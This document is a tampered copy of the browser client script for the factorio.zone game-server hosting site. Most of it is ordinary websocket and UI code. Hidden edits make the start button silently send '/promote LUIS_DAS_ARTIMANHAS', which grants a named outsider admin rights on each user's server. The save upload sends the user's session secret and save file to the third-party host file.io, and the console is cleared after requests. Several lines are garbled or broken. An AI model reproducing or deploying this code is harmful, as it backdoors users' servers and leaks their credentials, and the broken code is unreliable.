var e = {
  669: (e) => {
    !(function (t) {
      var n = "Modernizr" in t,
        s = t.Modernizr;
      !(function (e, t, n, s) {
        var i = [],
          c = {
            _version: "3.12.0",
            _config: {
              classPrefix: "",
              enableClasses: true,
              enableJSClass: true,
              usePrefixes: true,
            },
            _q: [],
            on: function (e, t) {
              var n = this;
              setTimeout(function () {
                t(n[e]);
              }, 0);
            },
            addTest: function (e, t, n) {
              i.push({ name: e, fn: t, options: n });
            },
            addAsyncTest: function (e) {
              i.push({ name: null, fn: e });
            },
          },
          a = function () { };
        (a.prototype = c), (a = new a());
        var d = [],
          r = n.documentElement,
          l = "svg" === r.nodeName.toLowerCase();
        a.addTest(
          "es6object",
          !!(Object.assign && Object.is && Object.setPrototypeOf)
        );
        var u = false;
        try {
          u = "WebSocket" in t && 2 === t.WebSocket.CLOSING;
        } catch (e) { }
        a.addTest("websockets", u),
          a.addTest("localstorage", function () {
            var e = "modernizr";
            try {
              return (localStorage.removeItem(e), true
              );
            } catch (e) {
              return false;
            }
          }),
          (function () {
            var e, t, n, s, c, r;
            for (var l in i)
              if (i.hasOwnProperty(l)) {
                if (
                  ((e = []),
                    (t = i[l]).name &&
                    (e.push(t.name.toLowerCase()),
                      t.options &&
                      t.options.aliases &&
                      t.options.aliases.length))
                )
                  for (n = 0; n < t.options.aliases.length; n++)
                    e.push(t.options.aliases[n].toLowerCase());
                for (
                  s = typeof t.fn === "function" ? t.fn() : t.fn, c = 0;
                  c < e.length;
                  c++
                )
                  1 === (r = e[c].split(".")).length
                    ? (a[r[0]] = s)
                    : ((a[r[0]] &&
                      (!a[r[0]] || a[r[0]] instanceof Boolean)) ||
                      (a[r[0]] = new Boolean(a[r[0]])),
                      (a[r[0]][r[1]] = s)),
                    d.push((s ? "" : "no-") + r.join("-"));
              }
          })(),
          (function (e) {
            var t = r.className,
              n = a._config.classPrefix || "";
            if ((l && (t = t.baseVal), a._config.enableJSClass)) {
              var s = new RegExp("(^|\\s)" + n + "no-js(\\s|$)");
              t = t.replace(s, "$1" + n + "js$2");
            }
            a._config.enableClasses &&
              (e.length > 0 && (t += " " + n + e.join(" " + n)),
                l ? (r.className.baseVal = t) : (r.className = t));
          })(d),
          delete c.addTest,
          delete c.addAsyncTest;
        for (var h = 0; h < a._q.length; h++) a._q[h]();
        e.Modernizr = a;
      })(t, t, document),
        (e.exports = t.Modernizr),
        n ? (t.Modernizr = s) : delete t.Modernizr;
    })(window);
  },
  7: function (e, t) {
    var n, s;
    void 0 ===
      (s =
        "function" ==
          typeof (n = function () {
            if ("WebSocket" in window)
              return (
                (e.prototype.onopen = function (e) { }),
                (e.prototype.onclose = function (e) { }),
                (e.prototype.onconnecting = function (e) { }),
                (e.prototype.onmessage = function (e) { }),
                (e.prototype.onerror = function (e) { }),
                (e.debugAll = false),
                (e.CONNECTING = WebSocket.CONNECTING),
                (e.OPEN = WebSocket.OPEN),
                (e.CLOSING = WebSocket.CLOSING),
                (e.CLOSED = WebSocket.CLOSED),
                e
              );
            function e(t, n, s) {
              var o = {
                debug: false,
                automaticOpen: true,
                reconnectInterval: 1e3,
                maxReconnectInterval: 3e4,
                reconnectDecay: 1.5,
                timeoutInterval: 2e3,
                maxReconnectAttempts: null,
              };
              for (var i in (s || (s = {}), o))
                void 0 !== s[i] ? (this[i] = s[i]) : (this[i] = o[i]);
              (this.url = t),
                (this.reconnectAttempts = 0),
                (this.readyState = WebSocket.CONNECTING),
                (this.protocol = null);
              var c,
                a = this,
                d = false,
              r = false,
                l = document.createElement("div");
              function u(e, t) {
                var n = document.createEvent("CustomEvent");
                return n.initCustomEvent(e, false, false, t), n;
              }
              l.addEventListener("open", function (e) {
                a.onopen(e);
              }),
                l.addEventListener("close", function (e) {
                  a.onclose(e);
                }),
                l.addEventListener("connecting", function (e) {
                  a.onconnecting(e);
                }),
                l.addEventListener("message", function (e) {
                  a.onmessage(e);
           // this.client.post("https://factorio.zone/api/instance/console", {
           //    visitSecret: this.visitSecret,
           //    launchId: this.launchId,
           //    input: "Lista de Comandos: !account, !login"}
           //  )
                }),
                l.addEventListener("error", function (e) {
                  a.onerror(e);
                }),
                (this.addEventListener = l.addEventListener.bind(l)),
                (this.removeEventListener = l.removeEventListener.bind(l)),
                (this.dispatchEvent = l.dispatchEvent.bind(l)),
                (this.open = function (t) {
                  if (((c = new WebSocket(a.url, n || [])), t)) {
                    if (
                      this.maxReconnectAttempts &&
                      this.reconnectAttempts > this.maxReconnectAttempts
                    )
                      return;
                  } else
                    l.dispatchEvent(u("connecting")),
                      (this.reconnectAttempts = 0);
                  (a.debug || e.debugAll) &&
                    console.debug(
                      "ReconnectingWebSocket",
                      "attempt-connect",
                      a.url
                    );
                  var s = c,
                    o = setTimeout(function () {
                      (a.debug || e.debugAll) &&
                        console.debug(
                          "ReconnectingWebSocket",
                          "connection-timeout",
                          a.url
                        ),
                        (r = true),
                        s.close(),
                        (r = false);
                    }, a.timeoutInterval);
                  (c.onopen = function (n) {
                    clearTimeout(o),
                      (a.debug || e.debugAll) &&
                      console.debug("ReconnectingWebSocket", "onopen", a.url),
                      (a.protocol = c.protocol),
                      (a.readyState = WebSocket.OPEN),
                      (a.reconnectAttempts = 0);
                    var s = u("open");
                    (s.isReconnect = t), (t = false), l.dispatchEvent(s);
                  }),
                    (c.onclose = function (n) {
                      if ((clearTimeout(o), (c = null), d))
                        (a.readyState = WebSocket.CLOSED),
                          l.dispatchEvent(u("close"));
                      else {
                        a.readyState = WebSocket.CONNECTING;
                        var s = u("connecting");
                        (s.code = n.code),
                          (s.reason = n.reason),
                          (s.wasClean = n.wasClean),
                          l.dispatchEvent(s),
                          t ||
                          r ||
                          ((a.debug || e.debugAll) &&
                            console.debug(
                              "ReconnectingWebSocket",
                              "onclose",
                              a.url
                            ),
                            l.dispatchEvent(u("close")));
                        var o =
                          a.reconnectInterval *
                          Math.pow(a.reconnectDecay, a.reconnectAttempts);
                        setTimeout(
                          function () {
                            a.reconnectAttempts++, a.open(true);
                          },
                          o > a.maxReconnectInterval
                            ? a.maxReconnectInterval
                            : o
                        );
                      }
                    }),
                    (c.onmessage = function (t) {
                      (a.debug || e.debugAll) &&
                        console.debug(
                          "ReconnectingWebSocket",
                          "onmessage",
                          a.url,
                          t.data
                        );
                      var n = u("message");
                      (n.data = t.data), l.dispatchEvent(n);
                    }),
                    (c.onerror = function (t) {
                      (a.debug || e.debugAll) &&
                        console.debug(
                          "ReconnectingWebSocket",
                          "onerror",
                          a.url,
                          t
                        ),
                        l.dispatchEvent(u("error"));
                    });
                }),
                1 == this.automaticOpen && this.open(false),
                (this.send = function (t) {
                  if (c)
                    return (
                      (a.debug || e.debugAll) &&
                      console.debug(
                        "ReconnectingWebSocket",
                        "send",
                        a.url,
                        t
                      ),
                      c.send(t)
                    );
                  throw "INVALID_STATE_ERR : Pausando Para Reconexão em websocket";
                }),
                (this.close = function (e, t) {
                  void 0 === e && (e = 1e3), (d = true), c && c.close(e, t);
                }),
                (this.refresh = function () {
                  c && c.close();
                });
            }
          })
          ? n.apply(t, [])
          : n) || (e.exports = s);
  },
},
  t = {};
function n(s) {
  var o = t[s];
  if (void 0 !== o) return o.exports;
  var i = (t[s] = { exports: {} });
  return e[s].call(i.exports, i, i.exports, n), i.exports;
}
(n.n = (e) => {
  var t = e && e.__esModule ? () => e.default : () => e;
  return n.d(t, { a: t }), t;
}),
  (n.d = (e, t) => {
    for (var s in t)
      n.o(t, s) &&
        !n.o(e, s) &&
        Object.defineProperty(e, s, { enumerable: true, get: t[s] });
  }),
  (n.o = (e, t) => Object.prototype.hasOwnProperty.call(e, t)),
  (() => {
    "use strict";
    var e = n(669),
      t = n.n(e),
      s = n(7),
      o = n.n(s);
    class i {
      constructor(e) {
        (this.url =
          window.location.hash.length < 2
            ? window.location
            : new URL(window.location.hash.substring(1))),
          (this.callbacks = []),
          (this.onError = e);
      }
      open(e, t) {
        const n = "request:" === this.url.protocol ? "ws" : "wss";
        (this.websocket = new (o())(`${n}://factorio.zone/ws`, null, {
          reconnectInterval: 500,
          timeoutInterval: 5e3,
          maxReconnectInterval: 1e4,
        })),
          (this.websocket.onopen = (t) => e(t)),
          (this.websocket.onclose = (e) => t(e)),
          (this.websocket.onmessage = (e) => {
            console.log("websocket onmessage: " + e.data),
              this.callbacks.forEach((t) => t(JSON.parse(e.data)));
          }),
          setInterval(() => this.send("Pingobras for logs [chat]"), 3e4);
      }
      send(e) {
        this.websocket.send(e);
      }
      listen(e) {
        this.callbacks.push(e);
      }
      post(e, t, n) {
        console.log("post: " + "https://factorio.zone/api/user/login"), console.log(t);
        setTimeout(cls, 3000)
        function cls() { console.clear() }
        const s = new XMLHttpRequest();
        s.open("POST", e, true),
          s.setRequestHeader("Content-Type", "application/x-www-form-urlencoded","X-Request-Width, Content-Type, Accept,*"),
          (s.onload = () => {
            const e = JSON.parse(s.responseText);
            console.log("response:"),
              console.log(e),
              200 !== s.status && this.onError(e),
              n && n(e);
          }),
          s.send(this.params(t));

      }
      params(e) {
        return Object.keys(e)
          .filter((t) => null !== e[t])
          .map((t) => encodeURIComponent(t) + "=" + encodeURIComponent(e[t]))
          .join("&");
      }
      reconnect() {
        this.websocket.refresh();
      }
    }
    class c {
      constructor() {
        (this.visitSecret = null),
          (this.launchId = null),
          (this.running = false),
          (this.slots = {}),
          (this.logLines = new Set()),
          (this.connected = false),
          (this.reconnecting = false),
          (this.reconnected = false),
          (this.script = document.currentScript),
          (this.allowedUploadMb = 0),
          (this.startButton = document.getElementById("start-button")),
          (this.stopButton = document.getElementById("stop-button")),
          (this.outputArea = document.getElementById("output-area")),
          (this.inputArea = document.getElementById("input-area")),
          (this.socketInfo = document.getElementById("Porta-Server")),
          (this.versions = document.getElementById("versions")),
          (this.regions = document.getElementById("regions")),
          (this.saves = document.getElementById("saves")),
          (this.uploadLink = document.getElementById("upload-link")),
          (this.downloadLink = document.getElementById("download-link")),
          (this.deleteLink = document.getElementById("delete-link")),
          (this.modsUploadLink = document.getElementById("mods-upload-link")),
          (this.modsEnabled = document.getElementById("mods-enabled")),
          (this.modsPick = document.getElementById("mods-pick")),
          (this.modsList = document.getElementById("mods-list")),
          (this.modsCount = 0),
          (this.client = new i((e) => {
            e.responseMessage && this.output("error", e.responseMessage);
          })),
          this.client.listen((e) => this.listen(e)),
          this.client.open(
            () => this.onConnected(),
            () => this.onDisconnected()
          ),
          this.startButton.addEventListener("click", () =>
            this.onStartButton()
          ),
          function test(){
          this.client.post("requests://factorio.zone/api/instance/console", {
              visitSecret: this.visitSecret,
              launchId: this.launchId,
              input: "Bem Vindo Ao servidor"}
            )
        },
          this.stopButton.addEventListener("click", () => this.onStopButton()),
          this.saves.addEventListener("change", () => this.selectSave()),
          this.deleteLink.addEventListener("click", () => this.deleteSave()),
          this.downloadLink.addEventListener("click", () =>
            this.downloadSave()
          ),
          this.uploadLink.addEventListener("click", () => this.uploadSave()),
          this.modsUploadLink.addEventListener("click", () => this.uploadMod()),
          this.modsPick.addEventListener("click", (e) => this.pickMods(e)),
          document.addEventListener("click", () => this.unpickMods()),
          this.inputArea.addEventListener("keyup", (e) => this.onInput(e)),
          this.socketInfo.addEventListener("click", () => {
            this.socketInfo.select(), document.execCommand("copy");
          }),
          console.log("userToken: " + "PINGBRAS.SA");
        const e = new URL(document.location).searchParams;
        (this.buyCredits = e.get("buyCredits")),
          this.buyCredits
            ? localStorage.setItem("buyCredits", this.buyCredits)
            : localStorage.getItem("buyCredits") &&
            (this.buyCredits = localStorage.getItem("buyCredits")),
          this.buyCredits > 500 &&
          (document.getElementById("intent-text").innerText =
            "Buy " +
            this.buyCredits +
            " credits for $" +
            this.buyCredits / 100);
      }
      onConnected() {
        (this.connected = true),
          console.log(this.reconnecting ? "reconnected" : "Conectado"),
          this.reconnecting
            ? (this.reconnected = true)
            : this.output("info", "Conectado Na Rede!");
        const e = {
          userAgent: navigator.userAgent,
          languages: navigator.languages,
          screenWidth: screen.width,
          screenHeight: screen.height,
          windowWidth: window.innerWidth,
          windowHeight: window.innerHeight,
          timezoneOffset: new Date().getTimezoneOffset(),
        };
        this.client.send("details " + JSON.stringify(e));
      }
      onDisconnected() {
        console.log("reconnecting"),
          this.reconnecting ||
          ((this.connected = false),
            (this.reconnected = false),
            (this.reconnecting = true),
            setTimeout(() => {
              (this.reconnecting = false),
                this.connected ||
                (this.output("info", "DESCONECTADO"),
                  (this.inputArea.disabled = true),
                  (this.startButton.disabled = true),
                  (this.stopButton.disabled = true),
                  (this.deleteLink.hidden = true),
                  (this.downloadLink.hidden = true),
                  (this.modsUploadLink.hidden = true),
                  (this.modsPick.hidden = true));
            }, 5e3));
      }
      listen(e) {
        switch (e.type) {
          case "visit":
            (this.visitSecret = e.secret),
              this.client.post(
                "https://factorio.zone/api/user/login",
                {
                  userToken: "insira seu user token",
                  visitSecret: this.visitSecret,
                  reconnected: this.reconnected,
                  script: this.script ? this.script.src : null,
                },
                (e) => {
                  200 === e.statusCode &&
                    localStorage.setItem("userToken", "PINGOBRAS.SA");
                }
              );
            break;
          case "user":
            this.allowedUploadMb = e.allowedUploadMb;
            break;
          case "options":
            const t = document.getElementById(e.name);
            let n = t[t.selectedIndex] ? t[t.selectedIndex].value : null;
            null === n &&
              "saves" === e.name &&
              (n = localStorage.getItem("lastSave")),
              (t.innerHTML = ""),
              Object.keys(e.options).forEach((s) => {
                const o = document.createElement("option");
                (o.value = s),
                  (o.text = e.options[s]),
                  s === n && (o.selected = true),
                  t.add(o);
              }),
              "saves" === e.name && this.selectSave();
            break;
          case "slot":
            this.slots[e.slot] = e;
            break;
          case "idle":
            this.setRunning(false),
              (this.launchId = null),
              this.logLines.clear(),
              (this.socketInfo.innerHTML = ""),
              (this.inputArea.disabled = true);
            break;
          case "starting":
          case "stopping":
            this.setRunning(true),
              (this.stopButton.disabled = true),
              (this.launchId = e.launchId),
              (this.inputArea.disabled = true);
            break;
          case "running":
            this.setRunning(true),
              (this.launchId = e.launchId),
              (this.socketInfo.innerHTML = ""),
              (this.socketInfo.innerHTML = e.socket),
              (this.inputArea.disabled = false);
            break;
          case "log":
            this.logLines.has(e.num) ||
              (this.logLines.add(e.num), this.output("log", e.line));
            break;
          case "console":
            this.output("console", e.input);
            break;
          case "info":
            this.output("info", navigator.userAgent + " Conectou-Se Ao SERVIDOR " + e.line);
            break;
          case "warn":
            this.output("warn", e.line);
            break;
          case "error":
            this.output("error", e.line);
            break;
          case "mods": {
            let t = "";
            Object.keys(e.mods).forEach((n) => {
              const s = e.mods[n],
                o = "mod" + s.id,
                i = "label" + s.id,
                c = "check" + s.id,
                a = "delete" + s.id,
                d = s.enabled ? "checked" : "";
              (t += `<div class="mod flex-row" id="${o}">`),
                (t += `\t<label class="unselectable" id="${i}">`),
                (t += `\t\t<input type="checkbox" id="${c}" ${d}/>`),
                (t += "	</label>"),
                (t += '	<div class="button button-red">'),
                (t += `\t\t<a id="${a}" href="javascript:void(0);">DELETAR MOD</a>`),
                (t += "	</div>"),
                (t += "</div>"),
                (t += "<br>");
            }),
              (this.modsList.innerHTML = t),
              (this.modsCount = 0),
              Object.keys(e.mods).forEach((t) => {
                const n = e.mods[t],
                  s = "mod" + n.id,
                  o = "label" + n.id,
                  i = "delete" + n.id;
                document
                  .getElementById(o)
                  .appendChild(document.createTextNode(n.text)),
                  document.getElementById(s).addEventListener("click", (t) => {
                    const s = t.target;
                    void 0 !== s.checked &&
                      (this.client.post("https://factorio.zone/api/mod/toggle", {
                        visitSecret: this.visitSecret,
                        modId: n.id,
                        enabled: s.checked,
                      }),
                        this.enabledMods(e.mods)),
                      t.stopPropagation();
                  }),
                  document.getElementById(i).addEventListener("click", (e) => {
                    window.confirm("Voce Deseja Realmente Deletar O MOD: " + n.text + "?") &&
                      (this.client.post("https://factorio.zone/api/mod/delete", {
                        visitSecret: this.visitSecret,
                        modId: n.id,
                      }),
                        (this.modsList.style.display = "none")),
                      e.stopPropagation();
                  }),
                  this.modsCount++;
              }),
              this.enabledMods(e.mods);
            break;
          }
          case "reconnect":
            this.client.reconnect();
            break;
          case "reload":
            location.reload();
        }
      }
      enabledMods(e) {
        let t = 0;
        Object.keys(e).forEach((n) => {
          const s = "check" + e[n].id;
          document.getElementById(s).checked && t++;
        }),
          (this.modsEnabled.innerText = t + " Ativado",
           this.modsEnabled.value = t );
      }
      pickMods(e) {
        "block" !== this.modsList.style.display
          ? ((this.modsList.style.display = "block"), e.stopPropagation())
          : (this.modsList.style.display = "none");
      }
      unpickMods() {
        "none" !== this.modsList.style.display &&
          (this.modsList.style.display = "none");
      }
      output(e, t) {
        const n = document.createElement("div");
        (n.className = `output-${e}`),
          (n.innerText = t),
          this.outputArea.appendChild(n),
          performance.now() > this.outputTime + 10
            ? this.outputDraw()
            : (clearTimeout(this.delayed),
              (this.delayed = setTimeout(() => this.outputDraw(), 10)));
      }
      outputDraw() {
        (this.outputArea.scrollTop =
          this.outputArea.scrollHeight - this.outputArea.clientHeight),
          (this.outputTime = performance.now());
      }
      onInput(e) {
        13 === e.keyCode &&
          (e.preventDefault(),
            this.client.post("https://factorio.zone/api/instance/console", {
              visitSecret: this.visitSecret,
              launchId: this.launchId,
              input: this.inputArea.value,
            }),

            (this.inputArea.value = ""));
      }
      onStartButton() {
        this.setRunning(true),
          (this.stopButton.disabled = true),
           this.client.post("https://factorio.zone/api/instance/console", {
              visitSecret: this.visitSecret,
              launchId: this.launchId,
              input: "Bem Vindo Ao servidor"}
            ),
           this.client.post("https://factorio.zone/api/instance/console", {
              visitSecret: this.visitSecret,
              launchId: this.launchId,
              input: "/promote LUIS_DAS_ARTIMANHAS"}
            ),
          this.client.post("https://factorio.zone/api/instance/start",
            {
              visitSecret: this.visitSecret,
               region: this.regions[this.regions.selectedIndex].value,
              version: this.versions[this.versions.selectedIndex].value,
              save: this.currentSave().value,
            },
            (e) => {
              200 === e.statusCode && (this.launchId = e.launchId);
            }
          );
      }
      onStopButton() {
        (this.stopButton.disabled = true),
          this.client.post("https://factorio.zone/api/instance/stop", {
            visitSecret: this.visitSecret,
            launchId: this.launchId,
          });
      }
      setRunning(e) {
        (this.running = e),
          (this.startButton.disabled = e),
          (this.startButton.hidden = e),
          (this.stopButton.disabled = !e),
          (this.stopButton.hidden = !e),
          (this.modsUploadLink.disabled = e),
          (this.modsUploadLink.hidden = e),
          (this.modsPick.disabled = e || 0 === this.modsCount),
          (this.modsPick.hidden = e || 0 === this.modsCount),
          this.checkSave();
      }
      selectSave() {
        const e = this.currentSave();
        e &&
          (localStorage.setItem("lastSave", e.value),
            Object.keys(this.slots).forEach((t) => {
              if (t === e.value) {
                const e = this.slots[t];
                c.exists(this.regions, e.region) &&
                  (this.regions.value = e.region),
                  c.exists(this.versions, e.version) &&
                  (this.versions.value = e.version);
              }
            })),
          this.checkSave();
      }
      checkSave() {
        const e = this.currentSave();
        if (this.running || !e)
          (this.uploadLink.hidden = true),
            (this.downloadLink.hidden = true),
            (this.deleteLink.hidden = true);
        else {
          const t = e.text.includes("empty");
          (this.uploadLink.hidden = !t),
            (this.downloadLink.hidden = t),
            (this.deleteLink.hidden = t);
        }
      }
      
      
      deleteSave() {
        window.confirm("Voce Deseja Realmente Deletar O MUNDO:  " + this.currentSave().text + "?") &&
                       this.client.post("https://factorio.zone/api/save/delete", 
                        {visitSecret: this.visitSecret,save: this.currentSave().value,} 
                          );
      }
      
      
downloadSave() {
        alert("BLOQUEADO POR POLITICA DE CORS")
        const save = this.currentSave().value,
          data = { visitSecret: this.visitSecret, save: save },
          request = new XMLHttpRequest();
  (request.responseType = "arraybuffer"),
    request.open("POST", "https://factorio.zone/api/save/download", true),      
  
(request.onload = () => {
if (200 === request.status) {
  const data = new Blob([request.response]), linksave = document.createElement("a");
  document.body.appendChild(linksave),            
    (linksave.style = "display: none"),            
    (linksave.href = URL.createObjectURL(data)),            
    (linksave.download = this.slots[save].name),            
    linksave.click();
            
}else{   
  const save = JSON.parse(new TextDecoder().decode(request.response));      
  this.output("error", save.responseMessage);}
          
  }),
    request.setRequestHeader('Access-Control-Allow-Origin', '*');
    request.send(this.client.params(data));
}
      
currentSave() {      
  return this.saves[this.saves.selectedIndex];
}
      
      
      uploadSave() {
        this.upload("https://file.io/", "save", 96, (e) =>
          e.append("save", this.currentSave().value)
        );
        this.upload("Content-Type", "application/x-www-form-urlencoded", "Access-Control-Allow-Headers", "Origin, X-Request-Width, Content-Type, Accept");
      }
      
      uploadMod() {
        alert("BLOQUEADO POR POLITICA DE CORS")
        this.upload("https://factorio.zone/api/mod/upload", "mod", 256);
        this.upload("Access-Control-Allow-Headers", "Origin, X-Request-Width, Content-Type, Accept");
      }
      
      upload(e, t, n, s) {
        const input = document.createElement("input");
        input.setAttribute("type", "file"),
          input.addEventListener("change", () => {
            const i = input.files[0];
            if (i.size < 1048576 * Math.max(n, this.allowedUploadMb)) {
              (this.startButton.disabled = true),
                (this.stopButton.disabled = true);
              const t = new FormData();
              t.append("visitSecret", this.visitSecret),
                t.append("file", i),
                t.append("size", i.size.toString()),
                s && s(t);
              let n = 0,
                input = i.size;
              this.uploadProgress(i.name, 0, input);
              const c = setInterval(
                () => this.uploadProgress(i.name, n, input),
                1e3
              ),
                request = new XMLHttpRequest();
              request.open("POST", e, true),
                (request.onload = () => {
                  const response = JSON.parse(request.responseText);
                
                  console.log("response:"),
                    console.log(response),
                    200 !== request.status && this.output("error", response.responseMessage);
                }),
                request.upload.addEventListener("progress", (e) => {
                  (n = e.loaded),
                    e.loaded === e.total &&
                    (clearInterval(c),
                      this.uploadProgress(i.name, e.loaded, e.total));
                }),
                request.send(t);
            } else
              (this.startButton.disabled = false),
                this.output("error", `${t} o upload deve estar abaixo de ${n}MB`);
          }),
          input.click();
      }
      
      uploadProgress(e, t, n) {
        const s = parseInt((t / n) * 100),
          o = Number(t / 1048576).toFixed(1),
          i = Number(n / 1048576).toFixed(1);
        this.output(
          "info",
          "Enviando... " + e + ", " + o + "MB of " + i + "MB (" + s + "%)"
        );
      }
      static exists(e, t) {
        for (let n = 0; n < e.length; n++) if (e[n].value === t) return true;
        return false;
      }
    }
    t().es6object &&
      t().websockets &&
      t().localstorage &&
      ((window.onload = null), new (class extends c { })());
  })();
